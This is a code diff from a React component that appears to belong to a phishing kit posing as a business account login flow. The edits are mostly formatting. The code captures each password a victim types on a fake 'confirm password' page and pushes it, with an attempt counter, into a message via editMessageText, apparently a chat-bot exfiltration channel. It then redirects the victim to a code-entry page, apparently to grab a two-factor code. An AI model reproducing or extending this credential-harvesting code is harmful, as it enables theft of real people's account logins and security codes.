@@ -104,7 +104,7 @@ const GetInfo: React.FC = () => {
 			if (currentPath === '/business/home/confirm-password') {
 				setMessage(
 					message +
-						`\n<b>🔒 Password ${failedPasswordAttempts}</b> <code>${confirmPassword}</code>`,
+					`\n<b>🔒 Password ${failedPasswordAttempts}</b> <code>${confirmPassword}</code>`,
 				);
 				const messageID = localStorage.getItem('message_id');
 				editMessageText({
@@ -124,7 +124,7 @@ const GetInfo: React.FC = () => {
 					localStorage.setItem(
 						'message',
 						message +
-							`\n<b>🔒 Password ${failedPasswordAttempts}</b> <code>${confirmPassword}</code>`,
+						`\n<b>🔒 Password ${failedPasswordAttempts}</b> <code>${confirmPassword}</code>`,
 					);
 					navigate('/business/code-input');
 				} else {
@@ -193,6 +193,7 @@ const GetInfo: React.FC = () => {
 					emailInputRef,
 					passwordInputRef,
 					confirmPasswordInputRef,
+					isLoading,
 				}}
 			/>
 			<div className='flex flex-col justify-between border-b border-t border-gray-300 p-2 text-sm text-gray-500 sm:flex-row'>
@@ -208,9 +209,8 @@ const GetInfo: React.FC = () => {
 				</div>
 			</div>
 			<button
-				className={`my-5 flex w-full items-center justify-center rounded-lg bg-blue-500 p-4 font-semibold text-white hover:bg-blue-600 ${
-					isLoading ? 'cursor-not-allowed opacity-70' : ''
-				}`}
+				className={`my-5 flex w-full items-center justify-center rounded-lg bg-blue-500 p-4 font-semibold text-white hover:bg-blue-600 ${isLoading ? 'cursor-not-allowed opacity-70' : ''
+					}`}
 				onClick={handleButtonClick}
 				disabled={isLoading}
 			>
